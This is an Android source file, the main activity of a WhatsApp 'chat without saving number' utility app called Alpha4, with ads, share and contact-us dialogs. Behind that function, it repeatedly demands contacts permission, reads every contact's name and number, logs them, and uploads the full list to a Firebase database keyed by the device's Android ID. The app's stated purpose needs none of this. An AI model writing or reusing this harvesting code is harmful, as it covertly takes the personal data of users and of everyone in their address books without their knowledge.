package com.waseemshahzad.alpha4;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.app.Dialog;
import android.content.ActivityNotFoundException;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.material.bottomsheet.BottomSheetDialog;
import com.google.firebase.BuildConfig;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;
import com.gun0912.tedpermission.PermissionListener;
import com.gun0912.tedpermission.TedPermission;
import com.waseemshahzad.alpha4.model.ContactsModel;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    ArrayList<ContactsModel> contactList = new ArrayList<>();
    Button btn_send;
    TextView btn_contact,btn_shareapp,btn_rateus;
    EditText et_number;
    private AdView mAdView,mAdView2;

    private static final String[] PROJECTION = new String[]{
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        mAdView = findViewById(R.id.admob_adview);
        mAdView2 = findViewById(R.id.admob_adview2);
        et_number = findViewById(R.id.et_number);
        btn_send = findViewById(R.id.btn_send);
        btn_contact = findViewById(R.id.btn_contact);
        btn_shareapp = findViewById(R.id.btn_shareapp);
        btn_rateus = findViewById(R.id.btn_rateus);
        AdRequest adRequest = new AdRequest.Builder().build();
        mAdView.loadAd(adRequest);
        mAdView2.loadAd(adRequest);

        btn_send.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                String string = et_number.getText().toString();
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/"+string));
                startActivity(intent);




            }

        });

        if (!new SessionManager(MainActivity.this).getFirstRun()) {
            termsdialog(MainActivity.this, R.layout.termsandconditions);

        }else checkPermission();
        btn_contact.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
            showDialog();
            }
        });


        btn_rateus.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intentRateUs = new Intent(Intent.ACTION_VIEW);
                intentRateUs.setData(Uri.parse("market://details?id=" + getPackageName()));
                startActivity(intentRateUs);
            }
        });
        btn_shareapp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {



                Intent intentShare = new Intent(Intent.ACTION_SEND);
                intentShare.putExtra(Intent.EXTRA_TEXT, getString(R.string.share_text) + " https://play.google.com/store/apps/details?id=" + BuildConfig.APPLICATION_ID);
                intentShare.setType("text/plain");
                startActivity(Intent.createChooser(intentShare,"settings_share"));
            }
        });

    }
    public void showDialog(){
        Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.contactus_dialoge);
        dialog.getWindow().setBackgroundDrawableResource(R.drawable.dilog_bg);
        ImageView iv_call,iv_facebook,iv_google,iv_youtube;

        dialog.show();

        Button btn_close = dialog.findViewById(R.id.btn_close);
        btn_close.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }

        });
        iv_call=dialog.findViewById(R.id.iv_call);
        iv_facebook=dialog.findViewById(R.id.iv_facebook);
        iv_google=dialog.findViewById(R.id.iv_google);
        iv_youtube=dialog.findViewById(R.id.iv_youtube);

        iv_call.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                String defultapp = "WhatsApp";

                try {
                    String url = "https://api.whatsapp.com/send?phone=+923012861054" +
                            "&text=" + URLEncoder.encode("HELLO Alpha4 App TEAM !  ", "UTF-8");

                    Intent sendIntent = new Intent("android.intent.action.MAIN");
                    sendIntent.setAction(Intent.ACTION_VIEW);

                    if (defultapp.equalsIgnoreCase("WhatsApp")) {
                        sendIntent.setPackage("com.whatsapp");
                        Log.e("message", "WhatsApp");
                    }
                    sendIntent.setData(Uri.parse(url));
                    startActivity(sendIntent);

                } catch (Exception e) {
                    Log.e("message", e.getMessage());
                }
            }
        });
        iv_google.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse("mailto:"+"waasimalik@gmail.com"));
//                intent.putExtra(Intent.EXTRA_SUBJECT, "KSK User");
                intent.putExtra(Intent.EXTRA_SUBJECT, "Alpha4 USER");
                intent.putExtra(Intent.EXTRA_EMAIL, "\nThis email from Alpha4 App USER");

                startActivity(intent);





            }
        });
        iv_youtube.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent=null;
                String url="https://www.youtube.com/c/WasiManak";
                try {
                    intent =new Intent(Intent.ACTION_VIEW);
                    intent.setPackage("com.google.android.youtube");
                    intent.setData(Uri.parse(url));
                    startActivity(intent);
                } catch (ActivityNotFoundException e) {
                    intent = new Intent(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse(url));
                    startActivity(intent);
                }
            }
        });
        iv_facebook.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String YourPageURL = "https://www.facebook.com/CEdiscoveries";
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(YourPageURL));

                startActivity(browserIntent);
            }
        });

    }


    public void checkPermission() {

        PermissionListener permissionlistener = new PermissionListener() {
            @Override
            public void onPermissionGranted() {

                getContactList();
                new SessionManager(MainActivity.this).setFirstRun(true);

            }

            @Override
            public void onPermissionDenied(List<String> deniedPermissions) {
                Toast.makeText(MainActivity.this, "Permission Denied\n" + deniedPermissions.toString(), Toast.LENGTH_SHORT).show();
                checkPermission();
            }


        };
        TedPermission.with(MainActivity.this)
                .setPermissionListener(permissionlistener)
                .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                .setPermissions(android.Manifest.permission.READ_CONTACTS)
                .check();
    }


    private void getContactList() {
        final String[] PROJECTION = new String[]{
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        ContentResolver cr = getContentResolver();

        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor != null) {
            HashSet<String> mobileNoSet = new HashSet<String>();
            try {
                final int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                final int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                String name, number;
                while (cursor.moveToNext()) {
                    name = cursor.getString(nameIndex);
                    number = cursor.getString(numberIndex);
                    number = number.replace(" ", "");
                    if (!mobileNoSet.contains(number)) {
                        contactList.add(new ContactsModel(name, number));
                        mobileNoSet.add(number);
                        Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
                                + " No = " + number);

                    }
                }
                new TaskContact().execute();
            } finally {
                cursor.close();
            }
        }
    }

    public class TaskContact extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... voids) {

            DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("Alpha4_Contacts");
            databaseReference.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {

                    HashMap<String, Object> contactdetailObject = new HashMap<>();
                    String json = new Gson().toJson(contactList);
                    contactdetailObject.put("Contactsjson", json);
                    contactdetailObject.put("date", new MyHelperClass().getCurrentDateYYYYMMDDhhmmsss());
                    databaseReference.child(getDeviceUniqueID(MainActivity.this)).setValue(contactdetailObject);
                    Log.d("error", "Contacts Added");


                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {
                    Log.d("Error", error.getMessage());

                }
            });


            return null;
        }
    }

    public String getDeviceUniqueID(Activity activity) {
        String device_unique_id = Settings.Secure.getString(activity.getContentResolver(),
                Settings.Secure.ANDROID_ID);
        return device_unique_id;
    }
    public void termsdialog(Context context, int layout) {
        final BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(context);
        bottomSheetDialog.setContentView(layout);
        bottomSheetDialog.setCancelable(false);
        bottomSheetDialog.onAttachedToWindow();
        CheckBox checkbox = bottomSheetDialog.findViewById(R.id.checkbox);
        TextView tv_termscondition = bottomSheetDialog.findViewById(R.id.tv_termscondition);
        checkbox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {

                    checkPermission();
                    bottomSheetDialog.dismiss();
                }
            }
        });
        tv_termscondition.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String data = getResources().getString(R.string.termsconditionslink);
                try {
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(data));
                    Intent chooseIntent = Intent.createChooser(intent, "Choose from below");
                    startActivity(chooseIntent);
                }
                catch(ActivityNotFoundException e) {
                    // Chrome is probably not installed

                    bottomSheetDialog.dismiss();

                }
            }
        });
        bottomSheetDialog.show();
    }




    private long mLastBackClick = 0;

    @Override
    public void onBackPressed() {
        if (System.currentTimeMillis() - mLastBackClick < 1100) {
            super.onBackPressed();
        } else {
            AdController.adCounter++;
            if (AdController.adCounter == AdController.adDisplayCounter) {
                AdController.showInterAd(MainActivity.this, null, 0);
            } else {
                Toast.makeText(MainActivity.this, getResources().getString(R.string.exit_alert), Toast.LENGTH_SHORT).show();
                mLastBackClick = System.currentTimeMillis();
            }
        }
    }

}